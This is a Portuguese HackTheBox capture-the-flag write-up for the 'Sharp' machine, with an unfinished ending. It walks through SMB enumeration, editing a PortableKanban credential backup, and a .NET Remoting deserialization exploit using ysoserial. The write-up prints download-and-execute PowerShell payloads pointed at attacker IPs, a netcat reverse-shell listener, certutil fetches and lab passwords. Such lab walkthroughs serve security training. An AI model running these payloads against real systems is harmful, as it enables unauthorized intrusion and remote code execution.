<html>
 <body>
  <script src="https://www.hackthebox.eu/badge/148108"></script>
 </body>
 </html>


Back to all write-ups: [here](https://repo4chu.github.io/hackthebox/)


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sharp - HackTheBox - WriteUp
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![image](https://i.imgur.com/b8fWlNj.png)

**Tools** utilizadas:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap
smbclient
rpcclient
ExploitRemotingService
netcat
python
ysoserial
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PORT     STATE SERVICE            VERSION
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8888/tcp open  storagecraft-image StorageCraft Image Manager
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host


Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-12-08T12:21:23
|_  start_date: N/A

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   224.18 ms 10.10.14.1
2   224.76 ms 10.10.10.219
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
smbclient -L \\10.10.10.219 -N
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![Image](https://i.imgur.com/Fvm7tk6.png)

Vamos ao diretório kanban
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
smbclient -L \\10.10.10.219\\kanban -N
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![Image](https://i.imgur.com/yIbnT0B.png)

Podemos ver um arquivo chamado PortableKanban.pk3.bak que apararente ser um arquivo de backup, então vamos lê-lo
![Image](https://i.imgur.com/wWij6x7.png)

Ao abri-lo, podemos ver que, dentro do arquivo existem senhas criptografadas:
![Image](https://i.imgur.com/m4DVEag.png)

Começamos acessando o serviço SMB para copiar o programa para nossa maquina:

![Image](https://i.imgur.com/Wkz1IMK.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
smbclient \\\\10.10.10.219\\kanban -N
get pkb.zip
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Essa máquina, pela primeira vez tive que criar uma máquina Windows para usar como atacante...
Extraímos os arquivos do nosso arquivo pkb.zip

![Image](https://i.imgur.com/u7nyOBw.png)


Ao executarmos o arquivo PortableKanban.exe podemos perceber que ele faz a criação do arquivo PortableKanban.pk3.bak onde ele guarda as credenciais...
Então vamos substituir pelo arquivo PortableKanban.pk3.bak que encontramos em nosso alvo.

Ao substituir o arquivo PortableKanban.pk3, precisamos de credenciais para conseguir acessar o programa.

![Image](https://i.imgur.com/q1UFNLT.png)

![Image](https://i.imgur.com/GSP4UQv.png)

Pesquisando um pouco mais sobre o Kanban, pude perceber que dentro do programa é possivel retornar as senhas em plain-text com uma conta de Administrador...
Em nosso arquivo temos essas informações:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{"Id":"e8e29158d70d44b1a1ba4949d52790a0","Name":"Administrator","Initials":"","Email":"","EncryptedPassword":"k+iUoOvQYG98PuhhRC7/rg==","Role":"Admin","Inactive":false,"TimeStamp":637409769245503731}
{"Id":"0628ae1de5234b81ae65c246dd2b4a21","Name":"lars","Initials":"","Email":"","EncryptedPassword":"Ua3LyPFM175GN8D3+tqwLA==","Role":"User","Inactive":false,"TimeStamp":637409769265925613}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Portanto, temos um usuário administrador e um user comum.
O que podemos fazer é tentar editar o arquivo que guarda as senhas para acessar
Primeiro, vamos remover a senha do usuário lars para conseguir a senha do usuário Administrator, para isso deixaremos o campo 'EncryptedPassword' vazio, além disso, mudaremos a parte 'Role' de user para Admin.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{"Id":"0628ae1de5234b81ae65c246dd2b4a21","Name":"lars","Initials":"","Email":"","EncryptedPassword":"","Role":"Admin","Inactive":false,"TimeStamp":637409769265925613}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Após isso, tentamos acessar o programa com usuário 'lars' sem senha.

![Image](https://i.imgur.com/Af60F1P.png)


Ao desmarcar a opção Hide Passwords, temos nossas primeiras credenciais:
![Image](https://i.imgur.com/fk984oq.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Administrator:G2@$btRSHJYTarg
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Com isso, podemos voltar para nosso arquivo PortableKanban.pk3 inicial.
Agora ao abrirmos o Kanban, usamos as credenciais de Administrator.

Agora temos credenciais do usuário lars e do usuário Administrator:
![Image](https://i.imgur.com/tlGO5us.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
lars:G123HHrth234gRG
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

No outro diretório do SMB, chamado dev:

![Image](https://i.imgur.com/Er6JZCu.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
smbclient \\\\10.10.10.219\\dev -U lars
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Fazemos o download de todos esses arquivos para a nossa máquina para podermos analisarmos.

Usamos o dnSpy para analisar os arquivos .exe
Dentro do arquivo Client.exe, temos uma informação interessante:

![Image](https://i.imgur.com/gUNQ87R.png)

Temos uma credencial e um endereço:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
debug:SharpApplicationDebugUserPassword123!
tcp://localhost:8888/SecretSharpDebugApplicationEndpoint
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Pesquisando sobre como interagir com esse serviço, encontramos um exploit que interage com esse serviço através do Remoting.Channels.Tcp, o [ExploitRemotingService](https://github.com/tyranid/ExploitRemotingService).

Podemos compilar ele em nossa máquina, ou já fazer o download dele [compilado](https://github.com/parteeksingh005/ExploitRemotingService_Compiled).

Agora precisamos preparar nosso payload que enviaremos atraves do ExploitRemotingService.
Para isso vamos precisar do python e também do [yososerial](https://github.com/pwntester/ysoserial.net).

Devemos compilar o yososerial ou baixa-lo já [compilado](https://github.com/pwntester/ysoserial.net/releases/tag/v1.34).

Após isso, devemos preparar nossa shell.
Usaremos está [shell.ps1](https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1)

Vamos usar o ysoserial para criar nosso payload:
![Image](https://i.imgur.com/UEtxowu.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell -c IEX(new-object net.webclient).downloadstring('10.10.14.136/chu.ps1')"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Com o ExploitRemotingService enviaremos o nosso payload:
![Image](https://i.imgur.com/rcn6eSy.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\ExploitRemotingService.exe --user=debug --pass=SharpApplicationDebugUserPassword123! tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw +PAYLOAD
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ao enviar o payload, devemos ativar nosso servidor python e abrir uma porta em nossa máquina para receber a conexão de nossa shell.

![Image](https://i.imgur.com/hCp7bvX.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python -m SimpleHTTPServer 80
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![Image](https://i.imgur.com/y3AYsaE.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nc -vvnlp 1337
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Temos nossa shell inicial :)

Para escalar nossos privilégios, vamos executar o 'winpeas.exe', portanto, devemos envia-lo primeiro, vamos gerar nosso payload no ysoserial:
![Image](https://i.imgur.com/P7Mwi7Y.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell -c IEX(new-object net.webclient).downloadstring('http://10.10.14.128/winpeas.exe')"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ao acessar a pasta C:\users\lars\Documents\ nos deparamos com uma pasta chamada wcf, vamos compacta-la e move-la para o diretório compartilhado do SMB.
![Image](https://i.imgur.com/hgqNEMp.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Compress-Archive -LiteralPath C:\users\lars\Documents\wcf -DestinationPath C:\users\lars\Documents\wcf.zip
move-item -path C:\users\lars\Documents\wcf.zip -destination c:\dev
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Após compactar e mover para pasta compartilhada no SMB, acessamos com credenciais já obtidas e baixamos para nossa máquina:

![Image](https://i.imgur.com/4QTDFQ5.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
smbclient \\\\10.10.10.219\\dev -U lars
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![Image](https://i.imgur.com/znyZr6A.png)


Ao baixar o arquivo para nossa máquina, podemos abri-lo no VisualStudio:
![Image](https://i.imgur.com/yEePAM8.png)

Vamos adicionar nossa linha no código e depois compilar.
![Image](https://i.imgur.com/MBxWpho.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Console.WriteLine(client.InvokePowerShell(" iex (new-object net.webclient).downloadstring('http://10.10.14.146/chu.ps1')"));
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
certutil -urlcache -split -f "http://10.10.14.136/WcfRemotingLibrary.dll" WcfRemotingLibrary.dll
certutil -urlcache -split -f "http://10.10.14.136/WcfClient.exe" WcfClient.exe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo 





if i helped you, add + respect at my profile :D
<html>
 <body>
  <script src="https://www.hackthebox.eu/badge/148108"></script>
 </body>
 </html>
 
my references
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
https://parsiya.net/blog/2015-11-14-intro-to-.net-remoting-for-hackers/
https://docs.microsoft.com/pt-br/dotnet/api/system.runtime.remoting.channels.tcp?view=netframework-4.8
https://docs.microsoft.com/pt-br/dotnet/api/system.runtime.remoting.channels.tcp.tcpchannel?view=netframework-4.8
https://github.com/tyranid/ExploitRemotingService
https://eternallybored.org/misc/netcat/
https://github.com/pwntester/ysoserial.net
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
